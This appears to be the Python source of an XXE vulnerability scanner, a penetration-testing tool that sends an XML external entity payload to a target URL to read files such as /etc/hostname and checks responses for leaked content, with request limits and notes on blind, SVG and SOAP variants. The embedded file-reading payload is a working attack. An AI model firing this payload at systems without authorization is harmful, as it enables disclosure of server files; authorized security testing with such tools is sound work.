#!/usr/bin/env python3
"""
REVUEX - XXE Scanner
XML External Entity Injection Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
XXE testing can read sensitive files - use responsibly.
"""

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse

# Disable warnings for self-signed certificates
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XXEScanner:
    """
    XXE (XML External Entity) Vulnerability Scanner

    Features:
    - Classic XXE (file disclosure)
    - Blind XXE (out-of-band)
    - XXE via SVG upload
    - XXE via SOAP requests
    - Parameter Entity attacks
    - Billion Laughs (DoS)
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        """
        Initialize XXE Scanner
        """
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay
        
        # Safety limits
        self.max_requests = 60
        self.request_count = 0
        self.timeout = 10
        self.max_file_read = 1024  # 1KB max file read
        
        self.headers = {
            'User-Agent': 'REVUEX-XXEScanner/1.0 (Security Research; +[https://github.com/G33L0](https://github.com/G33L0))',
            'Content-Type': 'application/xml'
        }
        
        self.vulnerabilities = []
        self.manual_checks = []

    def scan(self) -> List[Dict[str, Any]]:
        """Main XXE scanning method"""
        print(f"\n{'='*60}")
        print(f"📄 REVUEX XXE Scanner")
        print(f"{'='*60}")
        print(f"Target: {self.target}")
        print(f"Safety Delay: {self.delay}s")
        print(f"Max File Read: {self.max_file_read} bytes")
        print(f"{'='*60}\n")
        
        print("⚠️  SAFETY NOTES:")
        print("   • Only reads first 1KB of files")
        print("   • Tests common safe files only")
        print("   • No DoS attacks executed\n")
        
        # Test 1: Classic XXE (the only test that produces confirmable evidence).
        # Blind/SVG/parameter-entity/SOAP variants require out-of-band callbacks
        # or a file-upload endpoint we cannot confirm by POSTing XML to the base
        # URL, so they are documented as manual checks rather than fabricated
        # findings (see _document_manual_checks).
        print("📂 Test 1: Classic XXE (File Disclosure)")
        self._test_classic_xxe()
        time.sleep(self.delay)

        # Record non-confirmable variants as manual guidance only.
        self._document_manual_checks()

        # Save results
        self._save_results()
        
        print(f"\n{'='*60}")
        print(f"✅ Scan Complete")
        print(f"Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Requests: {self.request_count}/{self.max_requests}")
        print(f"{'='*60}\n")
        
        return self.vulnerabilities

    def _test_classic_xxe(self):
        """Test classic XXE file disclosure"""
        print("   Testing file disclosure...")
        
        test_files = [
            '/etc/hostname',
            '/etc/issue',
            'file:///etc/hostname',
        ]
        
        for test_file in test_files:
            if self.request_count >= self.max_requests:
                break
            
            payload = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{test_file}">]><root><data>&xxe;</data></root>'
            
            print(f"   → Testing: {test_file}")
            response = self._make_request(payload)
            
            if response and self._check_file_disclosure(response):
                vuln = {
                    'type': 'XXE - File Disclosure',
                    'severity': 'critical',
                    'url': self.target,
                    'disclosed_file': test_file,
                    'description': 'XML parser processes external entities, allowing arbitrary file read',
                    'evidence': f'Successfully read {test_file}',
                    'remediation': [
                        'Disable XML external entities',
                        'Use defusedxml library for Python',
                        'Disable DTD processing entirely'
                    ],
                    'tags': ['xxe', 'critical', 'file_disclosure']
                }
                self.vulnerabilities.append(vuln)
                print(f"      ✓ VULNERABLE: File disclosure via XXE")
                break
            time.sleep(self.delay)

    def _document_manual_checks(self):
        """Record XXE variants that cannot be confirmed by POSTing XML to the
        base URL. These used to be appended as fabricated 'high' vulnerabilities
        for every target. They are now manual guidance only (severity info,
        confidence manual-verification-required) and are NOT counted as findings."""
        print("\n🕵️  Recording manual-verification XXE variants (not auto-confirmable)")
        variants = [
            ('XXE - Blind (Out-of-Band)',
             'Requires an attacker-controlled DNS/HTTP collector to observe a '
             'callback. Use an OOB payload pointing at your collector (e.g. '
             'Burp Collaborator / interactsh) and confirm an inbound hit.',
             ['xxe', 'blind', 'out_of_band']),
            ('XXE - SVG Upload',
             'Only relevant where the app accepts SVG/XML file uploads and parses '
             'them. Upload an SVG with an external entity and confirm file content '
             'or an OOB callback.',
             ['xxe', 'svg', 'upload']),
            ('XXE - Parameter Entity',
             'Advanced OOB technique using parameter entities and an external DTD. '
             'Confirm via a collector callback that exfiltrates file content.',
             ['xxe', 'parameter_entity']),
            ('XXE - SOAP API',
             'Applies to SOAP/XML API endpoints. Inject an external entity into a '
             'SOAP body and confirm file disclosure or an OOB callback.',
             ['xxe', 'soap']),
        ]
        for name, how, tags in variants:
            self.manual_checks.append({
                'type': name,
                'severity': 'info',
                'confidence': 'manual-verification-required',
                'url': self.target,
                'how_to_confirm': how,
                'tags': tags + ['manual', 'unconfirmed'],
            })
            print(f"   • Manual check: {name}")

    def _make_request(self, payload: str) -> Optional[requests.Response]:
        """Make XML request"""
        if self.request_count >= self.max_requests:
            return None
        try:
            response = requests.post(
                self.target,
                data=payload,
                headers=self.headers,
                timeout=self.timeout,
                verify=False
            )
            self.request_count += 1
            return response
        except:
            return None

    def _check_file_disclosure(self, response: requests.Response) -> bool:
        """Check if a file was actually disclosed.

        The previous signature list matched common words like 'localhost',
        'ubuntu', 'debian', 'hostname' and '/usr/' that appear on countless
        ordinary web pages, causing false positives. We now require signatures
        that are specific to the actual contents of the files we requested
        (/etc/hostname, /etc/issue) and are very unlikely to appear by chance in
        an HTML page. /etc/hostname is a single short token; /etc/issue typically
        contains an escape sequence like '\\n \\l' or a distro banner line."""
        text = response.text or ""

        # Strong, content-specific signatures.
        specific = [
            r'\\n\s+\\l',                        # /etc/issue escape codes: "\n \l"
            r'(Ubuntu|Debian|CentOS|Red Hat).{0,40}\\[nlrms]',  # /etc/issue banner + escape
        ]
        for pat in specific:
            if re.search(pat, text):
                return True

        # /etc/passwd-style line (if a payload escalates): user:x:uid:gid:
        if re.search(r'^[a-z_][a-z0-9_-]*:[x*]?:\d+:\d+:', text, re.MULTILINE):
            return True

        return False

    def _save_results(self):
        """Save results"""
        output_dir = self.workspace / "xxe_scans"
        output_dir.mkdir(parents=True, exist_ok=True)
        safe_target = re.sub(r'[^\w\-]', '_', self.target)
        output_file = output_dir / f"{safe_target}_xxe.json"
        with open(output_file, 'w') as f:
            json.dump({
                'scanner': 'XXEScanner',
                'target': self.target,
                'vulnerabilities': self.vulnerabilities,
                'manual_checks': self.manual_checks
            }, f, indent=2)
        print(f"\n💾 Saved: {output_file}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python xxe_scanner.py <target_url>")
        sys.exit(1)

    scanner = XXEScanner(sys.argv[1], Path("revuex_workspace"), delay=5.0)
    scanner.scan()
